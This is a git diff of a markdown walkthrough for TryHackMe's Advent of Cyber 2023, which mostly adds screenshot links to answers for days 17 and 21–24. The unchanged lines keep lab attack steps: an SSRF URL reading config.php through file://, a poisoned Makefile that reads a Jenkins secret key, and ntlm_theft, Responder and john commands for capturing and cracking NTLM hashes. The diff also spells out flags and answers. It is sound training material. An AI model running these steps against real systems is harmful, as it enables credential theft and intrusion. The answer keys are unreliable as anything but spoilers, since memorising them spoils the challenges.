@@ -1268,7 +1268,7 @@ In this task we will be looking at SiLK and how we can use it to filter the traf
    silk_config -v
    ```
 
-   SILK VERSION
+   ![D17 Silk Version](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2023/Advent_Of_Cyber_2023_D17_Silk_Version.png)
 
    ><details><summary>Click for answer</summary>3.19.1</details>
 
@@ -1280,7 +1280,7 @@ In this task we will be looking at SiLK and how we can use it to filter the traf
    rwfileinfo suspicious-flows.silk
    ```
 
-   FILE INFO
+   ![D17 File Info](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2023/Advent_Of_Cyber_2023_D17_File_Info.png)
 
    ><details><summary>Click for answer</summary>11774</details>
 
@@ -1292,7 +1292,7 @@ In this task we will be looking at SiLK and how we can use it to filter the traf
    rwcut suspicious-flows.silk --fields=protocol,sIP,sPort,dIP,dPort,sTime --num-recs=6
    ```
 
-   RECORD 6
+   ![D17 Record 6](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2023/Advent_Of_Cyber_2023_D17_Record_6.png)
 
    ><details><summary>Click for answer</summary>2023/12/05T09:33:07.755</details>
 
@@ -1304,7 +1304,7 @@ In this task we will be looking at SiLK and how we can use it to filter the traf
    rwfilter suspicious-flows.silk --protocol=17 --pass=stdout | rwcut --num-recs=6
    ```
 
-   UDP RECORDS
+   ![D17 Udp Records](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2023/Advent_Of_Cyber_2023_D17_Udp_Records.png)
 
    ><details><summary>Click for answer</summary>49950</details>
 
@@ -1316,7 +1316,7 @@ In this task we will be looking at SiLK and how we can use it to filter the traf
    rwstats suspicious-flows.silk --fields=dPort --values=records,packets,bytes,sIP-Distinct,dIP-Distinct --count=10
    ```
 
-   STATISTICS
+   ![D17 Statistics](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2023/Advent_Of_Cyber_2023_D17_Statistics.png)
 
    ><details><summary>Click for answer</summary>35.332088</details>
 
@@ -1328,7 +1328,7 @@ In this task we will be looking at SiLK and how we can use it to filter the traf
    rwstats suspicious-flows.silk --fields=sIP --values=bytes,records --count=10 --top
    ```
 
-   TOP TALKERS
+   ![D17 Top Talkers](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2023/Advent_Of_Cyber_2023_D17_Top_Talkers.png)
 
    ><details><summary>Click for answer</summary>735229</details>
 
@@ -1340,7 +1340,7 @@ In this task we will be looking at SiLK and how we can use it to filter the traf
    rwfilter suspicious-flows.silk --protocol=17 --dport=53 --pass=stdout | rwcut --num-recs=1
    ```
 
-   DNS
+   ![D17 Dns](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2023/Advent_Of_Cyber_2023_D17_Dns.png)
 
    ><details><summary>Click for answer</summary>2023/12/08T04:28:44.825</details>
 
@@ -1354,7 +1354,7 @@ In this task we will be looking at SiLK and how we can use it to filter the traf
    rwfilter suspicious-flows.silk --aport=53 --pass=stdout | rwstats --fields=sIP,dIP --count=10
    ```
 
-   POSSIBLE C2
+   ![D17 Possible C2](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2023/Advent_Of_Cyber_2023_D17_Possible_C2.png)
    
    We can see that port 53 (DNS) is of most interest to us. And the second command gives us which IPs are using these ports.
 
@@ -1366,7 +1366,7 @@ In this task we will be looking at SiLK and how we can use it to filter the traf
    rwfilter suspicious-flows.silk --saddress=175.219.238.243 --dport=53 --pass=stdout | rwcut --fields=sIP,sPort,dIP,dPort,sTime --num-recs=10
    ```
 
-   POSSIBIBLE C2 ORIGIN
+   ![D17 Possible C2 Origin](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2023/Advent_Of_Cyber_2023_D17_Possible_C2_Origin.png)
 
    It looks like our first IP is the compromised machine as it is the one sending data to port 53.
 
@@ -1384,7 +1384,7 @@ In this task we will be looking at SiLK and how we can use it to filter the traf
    rwfilter suspicious-flows.silk --aport=80 --pass=stdout | rwstats --fields=sIP,dIP,dPort --count=10
    ```
 
-   FLOOD IP ORIGIN
+   ![D17 Flood IP Origin](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2023/Advent_Of_Cyber_2023_D17_Flood_IP_Origin.png)
 
    ><details><summary>Click for answer</summary>175[.]215[.]236[.]223</details>
 
@@ -1398,7 +1398,7 @@ In this task we will be looking at SiLK and how we can use it to filter the traf
     rwfilter suspicious-flows.silk --saddress=175.215.235.223 --pass=stdout | rwcut --fields=sIP,dIP,dPort,sTime,Flags | head
     ```
 
-    SYN PACKETS
+    ![D17 Syn Packets](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2023/Advent_Of_Cyber_2023_D17_Syn_Packets.png)
 
     Since we want the number of sent SYN packets by `175.215.236.223` we can use:
 
@@ -1406,7 +1406,7 @@ In this task we will be looking at SiLK and how we can use it to filter the traf
     rwfilter suspicious-flows.silk --saddress=175.215.236.223 --pass=stdout | rwstats --fields=sIP,flags,dIP --count=10
     ```
 
-    SENT SYN
+    ![D17 Sent Syn](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2023/Advent_Of_Cyber_2023_D17_Sent_Syn.png)
 
     ><details><summary>Click for answer</summary>1658</details>
 
@@ -1667,13 +1667,13 @@ In this task we will be looking at how we can posion a CI/CD pipeline using the 
 
    When recreating the steps outlined in the text we can see that we don't have permission to change the jenkins file in the repository.
 
-   MODIFY JENKINSFILE
+   ![D21 Modify Jenkinsfile](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2023/Advent_Of_Cyber_2023_D21_Modify_Jenkinsfile.png)
 
-   TEST PUSH
+   ![D21 Test Push](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2023/Advent_Of_Cyber_2023_D21_Test_Push.png)
    
    As mentioned we can try modifiying the makefile from the other repository
    
-   MODIFY MAKEFILE
+   ![D21 Modify Makefile](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2023/Advent_Of_Cyber_2023_D21_Modify_Makefile.png)
 
    We commit the changes to the remote repository with the following commands:
 
@@ -1685,11 +1685,11 @@ In this task we will be looking at how we can posion a CI/CD pipeline using the 
 
    Now we run the main job in the Jenkins instance.
    
-   RUN TEST
+   ![D21 Run Test](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2023/Advent_Of_Cyber_2023_D21_Run_Test.png)
 
    Going back to the completed jobs we can see the output in the console output tab.
    
-   TEST RESULT
+   ![D21 Test Result](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2023/Advent_Of_Cyber_2023_D21_Test_Result.png)
 
    This seems to have worked. Let's repeat the steps with the command to get the linux kernel version:
 
@@ -1699,7 +1699,7 @@ In this task we will be looking at how we can posion a CI/CD pipeline using the 
 
    Push the changes to the repository and re-run the job.
    
-   KERNEL VERSION
+   ![D21 Kernel Version](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2023/Advent_Of_Cyber_2023_D21_Kernel_Version.png)
    
    ><details><summary>Click for answer</summary>5.4.0-1029-aws</details>
 
@@ -1711,7 +1711,7 @@ In this task we will be looking at how we can posion a CI/CD pipeline using the 
    cat /var/lib/jenkins/secret.key
    ```
 
-   MODIFY MAKEFILE 2
+   ![D21 Modify Makefile 2](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2023/Advent_Of_Cyber_2023_D21_Modify_Makefile_2.png)
    
    Push the changes and re-run the job.
    
@@ -1721,7 +1721,7 @@ In this task we will be looking at how we can posion a CI/CD pipeline using the 
    git push
    ```   
    
-   SECRET KEY
+   ![D21 Secret Key](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2023/Advent_Of_Cyber_2023_D21_Secret_Key.png)
 
    ><details><summary>Click for answer</summary>90e748eafdd2af4746a5ef7941e63272f24f1e33a2882f614ebfa6742e772ba7</details>
 
@@ -1741,11 +1741,13 @@ In this task we will exploit a SSRF vulnerability in the C2 server of McGreedy t
 
    On the homepage we are greeted with a login portal. At the bottom is a link to the API documention which could be usefull.
 
-   C2 LOGIN SCREEN
+   ![D22 C2 Login Screen](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2023/Advent_Of_Cyber_2023_D22_C2_Login_Screen.png)
+
+   ![D22 Interesting File](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2023/Advent_Of_Cyber_2023_D22_Interesting_File.png)
 
    On th page we can see which URL to use to access the resources. We can replace the external url with `file:////`. Which should let us access system files.
 
-   SSRF EXPLOIT
+   ![D22 Ssrf Exploit](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2023/Advent_Of_Cyber_2023_D22_Ssrf_Exploit.png)
 
    We can check to see if it works by looking for the index.php page. 
 
@@ -1755,7 +1757,7 @@ In this task we will exploit a SSRF vulnerability in the C2 server of McGreedy t
    http://10.10.150.36/getClientData.php?url=file:////var/www/html/index.php
    ```
 
-   INDEX
+   ![D22 Index](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2023/Advent_Of_Cyber_2023_D22_Index.png)
 
    Looks like we indeed get back the contents of the file. Lets try and see if the config.php file is in the same folder.
 
@@ -1763,7 +1765,7 @@ In this task we will exploit a SSRF vulnerability in the C2 server of McGreedy t
    http://10.10.150.36/getClientData.php?url=file:////var/www/html/config.php
    ```
 
-   CONFIG
+   ![D22 Config](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2023/Advent_Of_Cyber_2023_D22_Config.png)
 
    Success! Now we have the credentials to login to the server. 
 
@@ -1771,29 +1773,29 @@ In this task we will exploit a SSRF vulnerability in the C2 server of McGreedy t
 
    ><details><summary>Click for answer</summary>1.1</details>
 
-3. What is the username for accessing the C2 panel?
+4. What is the username for accessing the C2 panel?
 
    This was found in the previous question in the config.php file.
 
    ><details><summary>Click for answer</summary>mcgreedy</details>
 
-4. What is the flag value after accessing the C2 panel?
+5. What is the flag value after accessing the C2 panel?
 
    After logging into the server, we can see the flag at the top of the screen.
 
-   FLAG
+   ![D22 Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2023/Advent_Of_Cyber_2023_D22_Flag.png)
 
    ><details><summary>Click for answer</summary>THM{EXPLOITED_31001}</details>
 
-5. What is the flag value after stopping the data exfiltration from the McSkidy computer?
+6. What is the flag value after stopping the data exfiltration from the McSkidy computer?
 
    Under the "Hackes Users Information" tab on the dashboard we can see are the compromised machines.
 
-   ASSETS
+   ![D22 Assets](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2023/Advent_Of_Cyber_2023_D22_Assets.png)
 
    To get our flag we must remove the machine of McSkidy.
 
-   REMOVED
+   ![D22 Removed](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2023/Advent_Of_Cyber_2023_D22_Removed.png)
 
    ><details><summary>Click for answer</summary>THM{AGENT_REMOVED_1001}</details>
 
@@ -1829,7 +1831,7 @@ In this task we will be looking at coercing authentication techniques using Resp
    python3 ntlm_theft.py -g lnk -s 10.18.78.136 -f stealthy
    ```
 
-   CREATE FILE
+   ![D23 Create File](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2023/Advent_Of_Cyber_2023_D23_Create_File.png)
 
    Now we can transfer this file to the share using `smbclient`.
 
@@ -1839,7 +1841,7 @@ In this task we will be looking at coercing authentication techniques using Resp
    dir
    ```
 
-   TRANSFER FILE
+   ![D23 Transfer File](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2023/Advent_Of_Cyber_2023_D23_Transfer_File.png)
 
    Now we must start responder so it can listen for any received on our machine.
 
@@ -1849,11 +1851,11 @@ In this task we will be looking at coercing authentication techniques using Resp
    responder -I ens5
    ```
 
-   RESPONDER START
+   ![D23 Responder Start](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2023/Advent_Of_Cyber_2023_D23_Responder_Start.png)
 
    After waiting a little while we get a hit. The request contains the NTLM hash that could lead us to the password of the server.
 
-   RESPONDER INTERCEPT
+   ![D23 Responder Intercept](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2023/Advent_Of_Cyber_2023_D23_Responder_Intercept.png)
 
    Lets download the password list from the share to use as our wordlist.
 
@@ -1861,7 +1863,7 @@ In this task we will be looking at coercing authentication techniques using Resp
    get greedykeys.txt
    ```
 
-   PASSWORD LIST
+   ![D23 Password List](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2023/Advent_Of_Cyber_2023_D23_Password_List.png)
 
    After adding the intercepted hash to a file, we can use `john` to crack the NTLM password.
 
@@ -1869,7 +1871,7 @@ In this task we will be looking at coercing authentication techniques using Resp
    john --wordlist=ntlm_theft/stealthy/greedykeys.txt hash.txt
    ```
 
-   PASSWORD
+   ![D23 Password](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2023/Advent_Of_Cyber_2023_D23_Password.png)
 
    ><details><summary>Click for answer</summary>GreedyGrabber1</details>
 
@@ -1879,7 +1881,7 @@ In this task we will be looking at coercing authentication techniques using Resp
 
    On the desktop we can find our flag.
 
-   FLAG
+   ![D23 Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2023/Advent_Of_Cyber_2023_D23_Flag.png)
 
    ><details><summary>Click for answer</summary>THM{Greedy.Greedy.McNot.So.Great.Stealy}</details>
 
@@ -1893,11 +1895,11 @@ In this task we will take a look at how we can analyse an Android image using Au
 
    To start, we need to create a new case in Autopsy and import the image. Fortunately, this has already been done for us. So we can open the case  "Tracy McGreedy".
 
-   OPEN CASE
+   ![D24 Open Case](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2023/Advent_Of_Cyber_2023_D24_Open_Case.png)
 
    We can look through the photos on the phone in the file tree we can filter on the photos. One of these photos contains a flag.
 
-   FLAG
+   ![D24 Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2023/Advent_Of_Cyber_2023_D24_Flag.png)
 
    ><details><summary>Click for answer</summary>THM{DIGITAL_FORENSICS}</details>
 
@@ -1905,7 +1907,7 @@ In this task we will take a look at how we can analyse an Android image using Au
 
    Under contacts we can look for any saved contacts. 
 
-   CONTACT NAME
+   ![D24 Contact Name](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2023/Advent_Of_Cyber_2023_D24_Contact_Name.png)
 
    ><details><summary>Click for answer</summary>Detective Carrot-Nose</details>
 
@@ -1913,7 +1915,7 @@ In this task we will take a look at how we can analyse an Android image using Au
 
    Under messages there are various messages sent and received. One of these is a message sent by Tracy to Van Sprinkles.
 
-   PASSWORD
+   ![D24 Password](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2023/Advent_Of_Cyber_2023_D24_Password.png)
 
    ><details><summary>Click for answer</summary>chee7AQu</details>
 
@@ -1929,43 +1931,45 @@ The final step is to get a conviction in court. To do so we must provide the cor
 
    **Question 1**
 
-   JUDGEMENT 1
+   ![Judgement 1](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2023/Advent_Of_Cyber_2023_Judgement_1.png)
 
-   JUDGEMENT 1 QUESTION 1
+   ![Judgement 1 Question 1](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2023/Advent_Of_Cyber_2023_Judgement_1_Question_1.png)
 
    **Question 2**
 
-   JUDGEMENT 2
+   ![Judgement 2](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2023/Advent_Of_Cyber_2023_Judgement_2.png)
 
-   JUDGEMENT 2 QUESTION 1
-
-   JUDGEMENT 2 QUESTION 2
+   ![Judgement 2 Question 1](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2023/Advent_Of_Cyber_2023_Judgement_2_Question_1.png)
+   
+   ![Judgement 2 Question 2](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2023/Advent_Of_Cyber_2023_Judgement_2_Question_2.png)
 
    **Question 3**
 
-   JUDGEMENT 3
-
-   JUDGEMENT 3 QUESTION 1
+   ![Judgement 3](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2023/Advent_Of_Cyber_2023_Judgement_3.png)
+   
+   ![Judgement 3 Question 1](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2023/Advent_Of_Cyber_2023_Judgement_3_Question_1.png)
 
    **Question 4**
 
-   JUDGEMENT 4
-
-   JUDGEMENT 4 QUESTION 1
-
-   JUDGEMENT 4 QUESTION 2
+   ![Judgement 4](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2023/Advent_Of_Cyber_2023_Judgement_4.png)
+   
+   ![Judgement 4 Question 1](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2023/Advent_Of_Cyber_2023_Judgement_4_Question_1.png)
+   
+   ![Judgement 4 Question 2](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2023/Advent_Of_Cyber_2023_Judgement_4_Question_2.png)
 
    **Question 5**
 
-   JUDGEMENT 5
-
-   JUDGEMENT 5 QUESTION 1
+   ![Judgement 5](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2023/Advent_Of_Cyber_2023_Judgement_5.png)
+   
+   ![Judgement 5 Question 1](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2023/Advent_Of_Cyber_2023_Judgement_5_Question_1.png)
 
    **Question 6**
 
-   JUDGEMENT 6
-
-   JUDGEMENT 6 QUESTION 1
+   ![Judgement 6](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2023/Advent_Of_Cyber_2023_Judgement_6.png)
+   
+   ![Judgement 6 Question 1](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2023/Advent_Of_Cyber_2023_Judgement_6_Question_1.png)
+   
+   ![Judgement Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2023/Advent_Of_Cyber_2023_Judgement_Flag.png)
 
    ><details><summary>Click for answer</summary>THM{YouMeddlingKids}</details>
 
